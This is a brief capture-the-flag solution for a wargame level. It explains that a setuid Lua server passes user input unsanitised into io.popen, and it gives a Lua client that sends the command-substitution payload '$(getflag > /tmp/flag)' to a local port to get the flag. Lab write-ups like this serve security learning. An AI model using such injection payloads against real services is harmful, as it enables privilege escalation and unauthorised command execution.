# The level11 lua program in the home folder is running as a server
# with setuid permissions, which we can exploint thanks to this line in the
# server.
# 
# prog = io.popen("echo "..pass.." | sha1sum", "r")
#
# By passing in an executable to the server it get executed in the popen function.
# So all we have to do is pass in '$(getflag > /tmp/flag)' and then read the flag.


########### CLIENT ############
#!/usr/bin/env lua
#local host, port = "127.0.0.1", 5151
#local socket = require("socket")
#local tcp = assert(socket.tcp())

#tcp:connect(host, port);
#tcp:send("$(getflag > /tmp/flag)\n");

#tcp:close()


lua ./client.lua
cat /tmp/flag

